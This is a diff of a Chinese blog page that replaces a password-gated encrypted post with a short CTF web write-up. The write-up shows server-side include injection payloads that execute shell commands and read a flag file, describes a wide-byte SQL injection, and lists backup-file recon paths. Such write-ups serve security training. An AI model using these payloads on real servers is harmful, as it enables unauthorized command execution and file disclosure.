@@ -167,46 +167,42 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <script src=/js/crypto-js.js></script>
-<script>
-function doDecrypt (pwd, onError) {
-	console.log('in doDecrypt');
-	const txt = document.getElementById('enc_content').innerHTML;
-	let plantext;
-	try {
-		const bytes = CryptoJS.AES.decrypt(txt, pwd);
-		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
-	} catch(err) {
-		if(onError) {
-			onError(err);
-		}
-		return;
-	}
-	document.getElementById('enc_content').innerHTML = plaintext;
-	document.getElementById('enc_content').style.display = 'block';
-	document.getElementById('enc_passwd').style.display = 'none';
-	if(typeof MathJax !== 'undefined') {
-		MathJax.Hub.Queue(
-			['resetEquationNumbers', MathJax.InputJax.TeX],
-			['PreProcess', MathJax.Hub],
-			['Reprocess', MathJax.Hub]
-		);
-	}
-}
-</script>
-<div id="enc_content" style="display:none">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</div>
-<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
-<script>
-var onError = function(error) {
-	document.getElementById("enc_error").innerHTML = "password error!"
-};
-function decrypt() {
-var passwd = document.getElementById("enc_pwd_input").value;
-console.log(passwd);
-doDecrypt(passwd, onError);
-}
-</script>
-</div>
+        <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p>第一题，做的时候不小心跳过了。。。然后被表哥他们秒了。。。</p>
+<p>第二题，根据前端的ajax代码，利用bp发包即可，坑点（对我来说的坑点。。。）是要再cookie中带上自己的session，如果没带session，会给你重新Set-Cookie，但是我当时写了个脚本先抓取set-cookie的session值再发一次包，不知道为啥不行。。。😥</p>
+<p>第三题，ssi注入。虽然是知识盲区，但是网上的利用点相差无几</p>
+<p>执行cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>包含文件    #include file 包含文件的相对路径，#include virtual包含文件的虚拟路径。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;pwd&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;pwd&quot; --&gt;&lt;!--#exec cmd=&quot;pwd&quot; --&gt;	=&gt;失败</span><br><span class="line">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;	=&gt;失败</span><br></pre></td></tr></table></figure>
+
+<p>最后payload居然是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cat ../flag&quot; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第四题，附加题里面的大碗宽面，拿到题目就感觉是sql注入，简单测试下发现是宽字节注入，写了个脚本</p>
+<blockquote>
+<p>坑点因为是post传值，所以    %df    需要url解码一下</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(urllib.parse.unquote(r&quot;%df&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>发现存在select from的时候返回403，想内联注释试试比赛结束了。。。😥</p>
+<blockquote>
+<p>谢谢ctf集训队的大佬们带我飞</p>
+</blockquote>
+<p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
+<p><a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p>
+<p>.swp</p>
+<p>robots.txt</p>
+
       
 
 
@@ -458,6 +454,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CVE</a>
               </li>
              
@@ -470,19 +478,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">wp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">命令执行与代码执行</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -490,15 +486,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">命令执行与代码执行</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">docker</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">cbc字节翻转攻击</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">php开发</a>
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -506,11 +502,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -522,15 +514,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
+                <a href="javascript:void(0)" class="js-tag color5">cbc字节翻转攻击</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">php开发</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -542,7 +538,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xss</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
               </li>
             
             <div class="clearfix"></div>
